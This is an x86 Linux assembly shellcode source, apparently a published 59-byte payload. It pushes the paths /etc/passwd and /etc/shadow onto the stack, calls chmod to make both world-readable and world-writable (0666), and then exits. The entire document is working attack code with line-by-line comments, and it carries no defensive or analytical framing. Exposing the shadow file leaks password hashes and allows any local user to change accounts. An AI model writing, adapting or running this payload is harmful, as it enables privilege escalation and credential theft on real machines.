;Shellcode size : 59 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    mov cx, 0x1b6       ;Move 0x1b6 inside cx (666 in octal)
    push eax            ;Push a NULL byte on the stack 
    push 0x64777373
    push 0x61702f2f
    push 0x6374652f     ;Push "/etc//passwd%00" on the stack
    mov ebx, esp        ;Initialize ebx to the esp stack pointer
    mov al, 0xf         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80            ;execute systemcall

    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push a NULL byte on the stack 
    push 0x776f6461
    push 0x68732f2f
    push 0x6374652f     ;Push "/etc//shadow%00" on the stack
    mov ebx, esp        ;Initialize ebx to the esp stack pointer
    mov al, 0xf         ;move the systemcall number inside eax


    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80            ;execute systemcall


    xor eax, eax        ;Initialize eax to NULL
    xor ebx, ebx        ;Initialize eax to NULL
    inc eax             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> exit(0)
    int 0x80            ;execute systemcall
